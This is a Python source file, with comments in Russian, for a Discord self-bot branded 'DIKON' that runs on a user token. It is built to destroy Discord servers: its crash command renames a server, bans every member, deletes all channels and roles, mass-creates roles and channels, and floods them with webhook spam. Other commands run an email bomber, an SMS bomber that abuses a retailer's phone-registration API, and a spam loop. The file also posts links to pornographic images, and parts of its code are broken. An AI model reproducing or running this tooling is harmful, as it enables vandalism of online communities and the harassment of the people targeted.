try:
    import discord
    import asyncio
    import aiohttp
    import io
    import re
    import config
    import numpy
    import random
    import requests
    import datetime
    import time
    import requests as rq
    import colorama
    colorama.init()
    from colorama import Fore, Style
    from datetime import datetime
    from discord.ext import commands
    import silent
    import textwrap
    import os
    import sys
    import aeval
    from urllib.request import Request,urlopen
    from urllib.parse import urlencode, quote_plus
    import platform
    import smtplib
    import urllib
    import urllib.request
    import http.cookiejar
    from discord.ext import commands, tasks
except:
    print("Похоже, что ты не установил нужные библиотеки, установи их!")
#мы кончили делать импорты, переходим к коду


# ••••••••••НАСТРОЙКА БОТА•••••••••••••••


def banner():
    if platform.system().lower()=="windows":
        os.system("cls")
    else:
        os.system("clear") #не трогайте


try:
    nameyour = bot.user.name
except:
    nameyour = "[Не удалось загрузить имя]"

#здесь пишем ваше имя, только не стирайте ничего
#откроете консоль и поймете

namen = 'CRASH BY DIKON' # здесь пишем имя сервера при краше

icon = 'icon.jpg' #если что, вы можете поменять иконку. Тут надо указать иконку, которая будет при краше сервера, типо изменение иконки сервера, тут ее имя в файлах

webhook = 'Crasher' #имя вебхука при спаме

invite = 'https://discord.gg/cqQ9FUaskg' # а вот тут можете указать ссылку на свой сервак :)

spamtext = f'@everyone\nВы крашнуты!\nНаш сервер: {invite}' # текст спама вебхуками

reason = 'Crash' #тут ничего не трогать лучше

token = "ТОКЕН АККАУНТА" #введите свой токен аккаунт, как получить токен? # Найдите в ютубе =)

porno = "DIKON SELF BOT | Hello world... yea!" #здесь пишем текст вашего стрима

prefix = "." #префикс (это типо то, с чего начинаются все команды)



try:
    time=datetime.now().strftime("%H:%M")
except:
    time="[00:00]"
# не трогайте лучше, это переменная, которая хранит данные о времени



print(f"{Fore.YELLOW}[{time} | Self started]\nST") # крутой принт






# •••••••••••НАЧАЛО РАБОТЫ••••••••••••

def gcheck(ctx):
    return True



br = f"""
{Fore.LIGHTRED_EX}
██████╗░██╗██╗░░██╗░█████╗░███╗░░██╗
██╔══██╗██║██║░██╔╝██╔══██╗████╗░██║
██║░░██║██║█████═╝░██║░░██║██╔██╗██║
██║░░██║██║██╔═██╗░██║░░██║██║╚████║
██████╔╝██║██║░╚██╗╚█████╔╝██║░╚███║
╚═════╝░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚══╝
D̪̻̝I͕͎͔K̡͙͓O̡̘͙N̠͚
 
 """


# переменные лучше не трогайте, они для красоты принтов!
print(br)
gogo = """
____________▒▒ 
___________▒░░▒ 
__________▒░░░░▒ 
_________▒▒▒▒▒▒▒____ 
___▒▒▒▒▒________▒▒▒▒▒
___▒░░▒__▒▒▒▒___▒░░▒
___▒░▒_▒▒░░░░▒▒_▒░▒
___▒▒_▒░░░░░░░░▒_▒▒
___▒_ ▒░░░░░░░░░▒_▒
__▒▒ ▒░░░░░░░░░░░▒ ▒▒
_▒░▒ ▒░▓▓▓░░░▓▓▓░▒ ▒░▒
▒░░▒ ▒░▓o▓░░░▓o▓░▒ ▒░░▒
_▒░▒ ▒░▓▓▓░░░▓▓▓░▒ ▒░▒
__▒▒ ▒░░░░░▒▒░░░░▒ ▒▒
___▒_▒░░░▓░░░▓░░▒_▒
___▒▒_▒░░░▓▓▓░░▒_▒▒
___▒░▒_▒▒░░░░▒▒_▒░▒
___▒░░▒__▒▒▒▒___▒░░▒
___▒▒▒▒▒_______▒▒▒▒▒ 
_________▒▒▒▒▒▒▒ 
__________▒░░░░▒ 
___________▒░░▒ 
____________▒▒""" #БУУУУ
#ахаахаххахаха (можете убрать, если что)


bot = commands.Bot(command_prefix = prefix, self_bot=True, intents=discord.Intents.all(), help_command=None) #даем значение переменной bot

@bot.event
async def on_ready():
    await bot.change_presence(activity=discord.Streaming(name=porno, url='https://youtube.com/channel/UCM8V2tQL7oqUm39Sl9Wc00Q'), status=discord.Status.dnd) #запускаем бота

print("Вход в систему был совершен\n")
print("•••••••••••••••••••••••••••••••••••••••••••••")
eclipse_top = f"""{Fore.GREEN}
{time} | Token: [Засекречен]\n{time} | Вы успешно прошли авторизацию, токен верный!\n{time} | Prefix: {prefix}\n{time} | Status Text: {porno}\n{time} | Logging by: {nameyour}
"""

print(eclipse_top)
global sex
sex = f"""
{Fore.LIGHTRED_EX}\
░░░░░░░░▄█████▄░░░░░░░░░░▄█████▄░░░░░░░░
░░░░░░▄██▀░░▀██████████████▀░░▀██▄░░░░░░
░░░░░░███░░▄████████████████▄░░███░░░░░░
░░░░░░░██████████████████████████░░░░░░░
░░░░░░░░▀█████▀▄▀██████▀▄▀█████▀░░░░░░░░
░░░░░░░░░█████▄▀▄██████▄▀▄█████░░░░░░░░░
░░░░░░░░░███████▀▀▀▀▀▀▀▀███████░░░░░░░░░
░░░░░░░░░█████▀░░░████░░░▀█████░░░░░░░░░
░░░░░░░░░░████░░░░░▀▀░░░░░████░░░░░░░░░░
░░░░░░▄▄███████░░▀▀██▀▀░░███████▄▄░░░░░░
░░░░▄███████████▄▄░░░░▄▄███████████▄░░░░
░░▄██████████████████████████████████▄░░
▄█████████████▀▀░░░░░░░░▀▀█████████████▄
█████████████░░░░░░░░░░░░░░█████████████
██████▀▀████░░░░░░░░░░░░░░░░████▀▀██████
░▀▀▀▀░░░████░░░░░░░░░░░░░░░░████░░░▀▀▀▀░
░░░░░░░▄████▄░░░░░░░░░░░░░░▄████▄░░░░░░░
░░░░░▄██▀▀▀▀███▄░░░░░░░░▄███▀▀▀▀██▄░░░░░
░░░░░██░░░░░░███▄░░░░░░▄███░░░░░░██░░░░░
░░░░░██░░░░░░██████████████░░░░░░██░░░░░
░░░░░▀█▄░░░░▄█░░░░░░░░░░░░█▄░░░░▄██░░░░░
░░░░░░░▀████▀░░░░░░░░░░░░░░▀▀███▀▀░░░░░░
 """
sex2 = """
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠻⠛⠛⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⠁⠄⠄⠄⠄⠄⠄⠘⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣏⢻⣿⣿⣿⣿⡀⢠⣶⡆⢠⣶⡄⢀⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣦⠻⣿⣿⣿⣋⡈⠉⠡⠎⠉⠁⣈⣿⣿⣿⣿⠋⣼⣿⣿
⣿⣿⣿⣿⣦⠙⢿⣿⣿⡏⢦⣀⣀⣠⢪⣿⣿⣿⠟⢡⣾⣿⣿⣿
⣿⣿⣿⣿⣿⣷⣄⠙⠿⣷⣌⠉⠉⢁⣾⡿⠟⢁⣴⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡟⢛⣷⣄⡈⢙⡻⠿⡟⠉⣂⣴⡛⢿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡔⡿⢟⣛⡫⠥⢈⣑⡠⠭⣛⡻⢿⢸⣿⣿⣿⣿⣿
⣿⣄⣠⣄⣠⣆⠩⣽⣶⣶⣿⣿⣿⣿⣷⣶⡮⢁⣤⣀⣄⣄⣄⣿
⣿⣿⣿⣿⣿⣿⣀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣅⣸⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
""" #не трогайте лучше
print(f'{time} • Nuke Bot loaded succesfully!')

@bot.command()
async def help(ctx):
    await ctx.send(f"**```\nДобро пожаловать, товарищи!\n```**\n```\nСписок команд бота:\n{ctx.prefix}status <music, play, stream>\n{ctx.prefix}fun — Веселье\n{ctx.prefix}just — разные полезные команды\n{ctx.prefix}danger — помощь с командами краша```") #команда хелпа

@bot.command()
async def danger(ctx):
    await ctx.send(f"**```\nКоманды краша\n```**\n```\n{ctx.prefix}banall — бан всех участников\n{ctx.prefix}crash или nuke — краш сервера\n{ctx.prefix}spam <ваш текст> — начать спам вашим текстом\n{ctx.prefix}stop (остановить спам)\n{ctx.prefix}send — смс бомбер (работает неполностью)\n{ctx.prefix}bomber — тоже бомбер, но старая версия\n{ctx.prefix}email — спам на email\n```")
@bot.command()
async def email(ctx):
    bomb_email = input("Введи email адрес для атаки: ")
    email = input("Введи свой email адрес с которого будет спам: ")
    password = input("Введи пароль от своего email: ")
    message = input("Укажи сообщение спама: ")
    counter = int(input("Сколько сообщений отсылать? "))

    # gmail of outlook
    s_ = "gmail".lower()

    if s_ == "gmail":
        mail = smtplib.SMTP('smtp.gmail.com',587)
    elif s_ == "outlook":
        mail = smtplib.SMTP('smtp.office365.com',587)

    for x in range(0,counter):
        print("Отослано: ", x+1)
        mail.ehlo()
        mail.starttls()
        mail.login(email,password)
        mail.sendmail(email,bomb_email,message)
        time.sleep(1)

    mail.close()
@bot.command()
async def fun(ctx):
    await ctx.send(f"**```\nВеселья\n```**\n```\n{ctx.prefix}bear\n{ctx.prefix}naruto\n{ctx.prefix}ussr\n{ctx.prefix}emoji\n{ctx.prefix}name\n{ctx.prefix}8ball\n{ctx.prefix}freenitro\n```")










@bot.command()
async def just(ctx):
    await ctx.send(f"**```\nПолезные команды\n```**\n```\n{ctx.prefix}avatar \n{ctx.prefix}ping\n{ctx.prefix}eval <ваш код> — выполняет любой код, который вы напишите\n{ctx.prefix}clear <количество сообщений для очистки>\n{ctx.prefix}purge (очистка всех сообщений в канале)\n{ctx.prefix}coin\n{ctx.prefix}giveroles <название роли> (выдает всем участникам роль)\n{ctx.prefix}porn или nsfw\n—————•\n{ctx.prefix}copyserver (копировать сервер)\n{ctx.prefix}site <название> - открывает сайт с твоим названием\n{ctx.prefix}doublecopy (копирование половины сервера)\n{ctx.prefix}servers (показывает на каких серверах вы находитесь)\n{ctx.prefix}server (инфа о сервере)\n{ctx.prefix}prefix\n```")



@bot.event
async def on_command(ctx):
    print(f"[EVENT] • New command, check now: {ctx.prefix}{ctx.command}")

@bot.command()
async def status(ctx):
    await ctx.send(f"**```\nСтатусы и работы с ними\n```**\n```\nВсе очень просто! Нужно написать так:\n{ctx.prefix}status — помощь\n{ctx.prefix}status_watch\n{ctx.prefix}status_music\n{ctx.prefix}status_stream\n{ctx.prefix}status_game\nЕсли вы хотите убрать статус полностью, то напишите:\n{ctx.prefix}status_none\n```\n```\nУдачи!\n```")

def minify_text(txt):
    if len(txt) >= 1024:
        return f'''{str(txt)[:-900]}...
        ...и ещё {len(str(txt).replace(str(txt)[:-900], ""))} символов...'''
    else:
        return str(txt)

@bot.command()
async def site(ctx, *, msg):
    try:
        webbrowser.open(f'https://{msg}.com')
    except:
        webbrowser.open(f'https://{msg}.ru')
    await ctx.send(f'```py\n"""\nСайт {msg} открыт\n"""\n```')
    
    
    

@bot.command(aliases = ['eval'])
async def __eval(ctx, *, content):
    await ctx.send("Начинаю выполнение кода...")
    code = "\n".join(content.split("\n")[1:])[:-3] if content.startswith("```py") and content.endswith("```") else content
    standart_args = {
        "discord": discord,
        "commands": commands,
        "bot": bot,
        "tasks": tasks,
        "ctx": ctx,
        "asyncio": asyncio,
        "aiohttp": aiohttp,
        "os": os,
        'sys': sys,
        "time": time,
        "datetime": datetime,
        "random": random,
        "requests": requests
    }
    try:
        r = await aeval.aeval(f"""{code}""", standart_args, {})
        await ctx.send(f"**```\n🔒 | Выполнение\n```**\n```\nКод успешно выполнен, текущее время {time} \nСодержание кода:\n{minify_text(code) }\n```")
    except Exception as e:
        code = minify_text(code)
        await ctx.send(f"**```\nВозникла ошибка, я не могу выполнить данный код:\n```**\n```\n{minify_text(code)}\n```")
        raise e
        if content.startswith("") and content.endswith(""):
            await ctx.send("**```\n⚠️ | Ошибка\n```**\n```\nВы неправильно написали код, вот пример кода:\n```")
            await ctx.send("https://media.discordapp.net/attachments/939881695979663361/975493382422011914/2022-05-15-23-22-22-992.jpg")


@bot.command()
async def status_music(ctx):
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=porno), status=discord.Status.dnd)
    await ctx.send("```\nВы успешно выбрали статус [Слушает]\n```\n")
@bot.command()
async def bomber(ctx, msg):
    try:
        print("Смс отправляется")
        while True:
            r = requests.post("https://api.fix-price.com/buyer/v2/registration/phone/request", data = {"phone": msg})
    except:
        print('Oшибка')
        await ctx.send(r)
        await ctx.send("Ошибочка")






@bot.command()
async def status_stream(ctx):
    await bot.change_presence(activity=discord.Streaming(name=porno, url='https://youtube.com/channel/UCM8V2tQL7oqUm39Sl9Wc00Q'), status=discord.Status.dnd)
@bot.command()
async def status_game(ctx):
    await bot.change_presence(activity=discord.Game(name=porno), status=discord.Status.dnd)
@bot.command()
async def status_watch(ctx):
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=porno), status=discord.Status.dnd)
    await ctx.send("```\nВы выбрали статус: [Смотрит]\n```")

@bot.command()
async def status_none(ctx):
    await bot.change_presence(activity=None, status=discord.Status.dnd)

@bot.command()
async def send(ctx):
    await ctx.send("Будьте осторожны с этой функцией! Для продолжения перейдите в консоль")
    send(input("Укажи номер телефона: "), input("Укажи количество сообщений спама: "), 1)
@bot.command()
async def emoji(ctx):
    await ctx.send("🔻") #эмодзи!))))))
    await ctx.send("🔎")
    await ctx.send("🔻")

@bot.command()
async def avatar(ctx, member:discord.Member):
    if member == None:
        me = ctx.author
        await ctx.send(me.avatar_url)
        await ctx.send(member.avatar_url)

@bot.command()
async def name(ctx):
    await ctx.send("**Откройте консоль для продолжения**")
    name = input("Как вас зовут?")
    print(f"Спасибки, {name}")


@bot.command()
async def clear(ctx, number: int):
    await ctx.channel.purge(limit=number)
    await ctx.send("`Успешно!`")
    await ctx.send("**Я очистил все сообщения**")

@bot.command()
async def ussr(ctx):
    await ctx.send(f"СОВЕТСКИЙ СОЮЗ? Ты...Сказал про Ссср??? https://tenor.com/W2do.gif https://tenor.com/view/cccp-flag-wave-star-logo-gif-16196191 Ленин одобряет!...")

@bot.command()
async def bear(ctx):
    await ctx.send("**В консоли появится Мишка Фредди!**")
    print(sex)

@bot.command()
async def ping(ctx):
    await ctx.send(f"```\n 🏓Pong: {int(ctx.bot.ws.latency * 1000)}ms ```")

global jk
jk = 5

@bot.command()
async def spam(ctx, *, textspama=None):
    if textspama == None:
        await ctx.send("```\nВы упустили пропущенный элемент: текст спама\n```")
        print("Рекомендую написать текст спама")
    else:
        global jk
        jk = 1 #пока значение такое, будет спам
        while jk == 1:
            await ctx.send(textspama)
@bot.command()
async def stop(ctx):
    global jk
    jk = 0 #выключаем спам, изменяя переменную
    await ctx.message.add_reaction('✅') #если что, похоже на селф бота эклипса

# полная очистка чата
@bot.command()
async def purge(ctx):
    await ctx.channel.purge()

global sure
sure = 5 #не трогайте, иначе вы возможно крашните свой же сервер
@bot.command()
async def crash(ctx):
    await ctx.message.delete()
    print("[LOG] Начинаю краш...")
    await asyncio.sleep(5)
    print("[LOG] Меняю название сервера")
    await asyncio.sleep(2)
    await ctx.guild.edit(name=namen)
    print("[LOG] Начинаю удаление всех каналов и ролей сервера")
    global sure
    sure = 1
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            pass
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass
            print("[LOG] Начинаю создание всех ролей и каналов краша")
    for _i in range(150):
        await ctx.guild.create_role(name=f"nuked by Dikon Self Bot")
    for _i in range(240):
        await ctx.guild.create_text_channel(name=f"nuked-by-dikon")
    print("[LOG] Начинаю жесткий спам по текстовым каналам")
    sure = 3
    print("[LOG] Меняю иконку сервера, если у вас она не скачана или не записано в переменной icon, то увы ничего не получится")
    idk = ctx.guild
    try:
        with open(icon, 'rb') as f:
            icon = f.read()
            await ctx.guild.edit(icon=icon)
            print("[LOG] Успешно сменил иконку серверу (если не получилось, это уже проблема ваша)")
    except:
        print('[ERROR] Не удалось изменить иконку!')



@bot.event
async def on_guild_channel_create(channel):
    global sure
    if sure == 1:
        for i in range(50):
            await channel.create_webhook(name=webhook)
            hooklist = await channel.webhooks()
            for hook in hooklist:
                await hook.send(content=spamtext, wait=True)
        #спам вебхуками
        #если вы не дали согласие, краша не будет.
@bot.command()
async def banall(ctx):
    await ctx.message.delete()
    for user in ctx.guild.members:
        try:
            await user.ban()
            print(f"{Fore.GREEN}Забанено {user}")
        except:
            pass



@bot.command()
async def coin(ctx):
    url = 'https://api.coindesk.com/v1/bpi/currentprice/BTC.json'
    async with aiohttp.BotSession() as session:
        raw_response = await session.get(url)
        response = await raw_response.text()
        response = json.loads(response)
        await ctx.send("Bitcoin price is: $" + response['bpi']['USD']['rate'])





@bot.command(aliases=['8ball','ball'])
async def _8ball(ctx, *, question):
    responses = ["Несомненно.",
                 "Совершенно верно.",
                 "Без сомнения.",
                 "Определенно да.",
                 "Как я понимаю, да.",
                 "Наверняка.",
                 "Да.",
                 "Не рассчитывай на это.",
                 "Мой ответ - нет.",
                 "Мои источники говорят, что нет.",
                 "Прогноз не очень хороший.",
                 "Очень сомнительно."]
    await ctx.send(f'Вопрос: {question}\nОтвет: {random.choice(responses)}')
@bot.command()
async def porn(ctx):
    resp = [
        "https://cdn.discordapp.com/attachments/958767997550481429/970053530536783992/gay_file.mov", "https://media.discordapp.net/attachments/955457679940272208/968495901461078026/868_20220426155216.png", "https://images-ext-1.discordapp.net/external/LNe9DPD0VeuN13M07b8N8_g9o3xx_PzPvFhfhCftVOs/https/cdn.nekos.life/yuri/yuri082.jpg"

    ]
    await ctx.send(f"{random.choice(resp)}")

@bot.command()
async def giveroles(ctx, msg=None):
    if msg == None:
        await ctx.send("**```\n⚠️ | Ошибка\n```**\n```\nУкажи название роли в сообщении!\n```")
    else:
        mutedRole = discord.utils.get(ctx.guild.roles, name=msg)
        for member in ctx.guild.members:
            await member.add_roles(mutedRole)

@giveroles.error
async def giveroles_error(ctx, error):
    await ctx.send(f"**Не удалось выдать роль!**\nПопробуйте написать по инструкции eval")
    await ctx.send("Тебе нужно выполнить этот код, который внизу!")
    await ctx.send("""```py
@bot.command()
async def giveroles(ctx): # тут ничего не трогайте
     mutedRole = discord.utils.get(ctx.guild.roles, name="название роли") # пишите название роли
     for member in ctx.guild.members:
      await member.add_roles(mutedRole) # тут тоже все само будет работать
```
""")

@bot.command()
async def nsfw(ctx):
    resp = [
        "https://images-ext-2.discordapp.net/external/jKL88h8OW7EbA3pPoFkxGXzl-a75Wx3WwoqWi-lwbcM/https/otnosheniya-kiv.ru/wp-content/uploads/collection-sex-gifs-14.gif", "https://media.discordapp.net/attachments/955457679940272208/968495901461078026/868_20220426155216.png", "https://images-ext-1.discordapp.net/external/87gpOxRHf0296xKVavQUihT0IiiwuFvvUWYpy_tCIIA/https/images-ext-1.discordapp.net/external/uWeg-2hoEPSemg5BJk4WnrI-UEE0FxOL7r7TjoBFTjM/https/i0.nekobot.xyz/5/4/5/cf10f92a2827bee4bbb52de20732e.gif", "https://images-ext-2.discordapp.net/external/LqD6n9rSevF72GMvj_MPU6u5yyUjpH9C4tF0nkwDoNQ/https/images-ext-2.discordapp.net/external/BItkXQsco4sgrPjiM9kqCzFWPLWvy6OlSqku0_aKwMA/https/cdn.nekobot.xyz/e/9/c/0b9ebd6f9586252ddede47af9fb29.gif", "https://images-ext-2.discordapp.net/external/aNx1J5Bfu5y6BKUyKn2Xx94bpved_ufC4fAWrMial5E/https/cdn08.bdsmlr.com/uploads/photos/2020/03/92704/bdsmlr-92704-26p4S5EDjB.gif", "https://images-ext-2.discordapp.net/external/x3AkzdEF03GTPVg2LDDciY2luMkG7JaqX_6bUyKzL3E/https/static-ca-cdn.eporner.com/gallery/Hh/jh/crbiZnbjhHh/843143-jenaveve-jolie-nude.gif", "https://images-ext-2.discordapp.net/external/LkmthoY1GzeTbYCZjwEIPIDkrZlT7i43-b_g-4DxBsM/https/images-ext-2.discordapp.net/external/PGr7dScuPQSh9dt-uAdrLRwjBvLxmUSDkG3tpHy30Cg/https/i0.nekobot.xyz/7/1/a/c5f7e673dbbc3ab2ba63089dd1962.jpg", "https://media.discordapp.net/attachments/955457679940272208/971403073824124928/SPOILER_DimenkoAss.png"

    ]
    await ctx.send(f"{random.choice(resp)}")

@bot.command()
async def copyserver(ctx):
    if not ctx.guild: return
    await ctx.message.delete()
    guild = ctx.guild
    msglog=ctx.message
    icon_hash = guild.icon
    with open('clone_server.png', 'wb+') as handle:
        handle.write(rq.get(f'https://cdn.discordapp.com/icons/{guild.id}/{icon_hash}.png').content)
    new_guild = await bot.create_guild(name=f'[Клонирование] {guild.name}', icon=open('clone_server.png', 'rb').read())
    for dc in new_guild.channels:
        await dc.delete()
    roles = {}
    r = guild.roles
    r.reverse()
    for role in r:
        if role.is_bot_managed() or role.is_default() or role.is_integration() or role.is_premium_subscriber(): continue
        new_role=await new_guild.create_role(name=role.name, permissions=role.permissions, color=role.color, hoist=role.hoist, mentionable=role.mentionable)
        roles[role] = new_role
    everyone = guild.default_role
    roles[everyone] = new_guild.default_role
    await new_guild.default_role.edit(permissions=everyone.permissions, color=everyone.color, hoist=everyone.hoist, mentionable=everyone.mentionable)
    for dc in await new_guild.fetch_channels():
        await dc.delete()
    channels = {None: None}
    for cat in guild.categories:
        new_c = await new_guild.create_category(name=cat.name, position=cat.position)
        channels[cat] = new_c
    for catt in guild.by_category():
        cat = catt[0]
        chs = catt[1]
        if cat != None:
            for c in chs:
                if c.type==discord.ChannelType.text:
                    new_c = await new_guild.create_text_channel(name=c.name, category=channels[c.category], position=c.position, topic=c.topic, slowmode_delay=c.slowmode_delay, nsfw=c.nsfw)
                elif c.type==discord.ChannelType.voice:
                    new_c = await new_guild.create_voice_channel(name=c.name, category=channels[c.category], position=c.position, user_limit=c.user_limit)
                elif c.type==discord.ChannelType.news:
                    new_c = await new_guild.create_text_channel(name=c.name, category=channels[c.category], position=c.position, topic=c.topic, slowmode_delay=c.slowmode_delay, nsfw=c.nsfw)
                channels[c] = new_c
        else:
            for c in chs:
                if c.type==discord.ChannelType.text:
                    new_c = await new_guild.create_text_channel(name=c.name, category=None, position=c.position, topic=c.topic, slowmode_delay=c.slowmode_delay, nsfw=c.nsfw)
                elif c.type==discord.ChannelType.voice:
                    new_c = await new_guild.create_voice_channel(name=c.name, category=None, position=c.position, user_limit=c.user_limit)
                elif c.type==discord.ChannelType.news:
                    new_c = await new_guild.create_text_channel(name=c.name, category=None, position=c.position, topic=c.topic, slowmode_delay=c.slowmode_delay, nsfw=c.nsfw)
                channels[c] = new_c
    for c in guild.channels:
        overs = c.overwrites
        over_new = {}
        for target,over in overs.items():
            if isinstance(target, discord.Role):
                try:
                    over_new[roles[target]] = over
                except:
                    pass
            else:
                pass
        await channels[c].edit(overwrites=over_new)
    await new_guild.edit(verification_level=guild.verification_level, default_notifications=guild.default_notifications, explicit_content_filter=guild.explicit_content_filter, system_channel=channels[guild.system_channel], system_channel_flags=guild.system_channel_flags, afk_channel=channels[guild.afk_channel], afk_timeout=guild.afk_timeout)#это не оверврайт, но лучше его делать перед эмодзи
    for emoji in guild.emojis:
        try:
            url = f'https://cdn.discordapp.com/emojis/{emoji.id}.{"gif" if emoji.animated else "png"}'
            await new_guild.create_custom_emoji(name=emoji.name, image=rq.get(url).content)
        except:
            pass
    await ctx.message.edit("⌛")


@bot.command()
async def doublecopy(ctx):
    await ctx.message.delete()
    wow = await bot.create_guild(f'[COPY] {ctx.guild.name}')
    for g in bot.guilds:
        if f'[COPY] {ctx.guild.name}' in g.name:
            for c in g.channels:
                await c.delete()
            for cate in ctx.guild.categories:
                x = await g.create_category(f"{cate.name}")
                for chann in cate.channels:
                    if isinstance(chann, discord.VoiceChannel):
                        await x.create_voice_channel(f"{chann}")
                    if isinstance(chann, discord.TextChannel):
                        await x.create_text_channel(f"{chann}")
            print(ctx.guild.roles)
    for role in ctx.guild.roles[::-1]:
        if role.name != "@everyone":
            try:
                await wow.create_role(name=role.name, color=role.color, permissions=role.permissions, hoist=role.hoist, mentionable=role.mentionable)
                print(f"[LOG] Создал новую роль : {role.name}")
            except:
                break



@bot.command()
async def server(ctx):
    name = str(ctx.guild.name)
    description = str(ctx.guild.description)


    id = str(ctx.guild.id)
    region = str(ctx.guild.region)
    memberCount = str(ctx.guild.member_count)

    icon = str(ctx.guild.icon_url)
    await ctx.send(f"**```\nСтатистика сервера {ctx.guild.name}\n```**\n```diff\nУчастников: {memberCount}\nВладелец: {ctx.guild.owner}\nID сервера: {id}\nРегион сервера: {region}\nНебольшая инфа!\n```")
    await ctx.send(icon)
    await ctx.message.delete()

@bot.command()
async def servers(ctx):
    total = 0
    for guild in bot.guilds:
        if ctx.author in guild.members:
            total += 1
    await ctx.send(f"```\nВы находитесь на {total} серверах\n```")

@bot.command()
async def naruto(ctx):
    await ctx.send("https://media.discordapp.net/attachments/934850921337335818/936611120221937674/videoplayback_25.mp4")

@bot.command()
async def prefix(ctx, prefix):
    bot.command_prefix = prefix
    await ctx.send(f"теперь у бота префикс ``{prefix}``")

@bot.command()
async def freenitro(ctx, member: discord.Member = None):
    await ctx.message.delete()
    await ctx.send(f"https://tenor.com/bEsGa.gif")


@bot.event
async def on_command_error(ctx, error):
    error_str=str(error)
    error=getattr(error, 'original', error)
    if isinstance(error, commands.CommandNotFound):
        print(f"{Fore.RED}[ERROR] Команда не найдена")
    elif isinstance(error, commands.MissingRequiredArgument):
        print(
            f"{Fore.RED}[ERROR] Вы пропустили необходимый аргумент!")
    elif isinstance(error, discord.errors.Forbidden):
        print(
            f"{Fore.RED}[ERROR] Discord не смог загрузить команду")
    else:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW} Возникла ошибка при запуске команды"+Fore.RESET)

try:
    bot.run(token, bot = False)
except:
    print(f"{Fore.RED} | Не удалось подключиться к серверу, возможно токен неверный!")
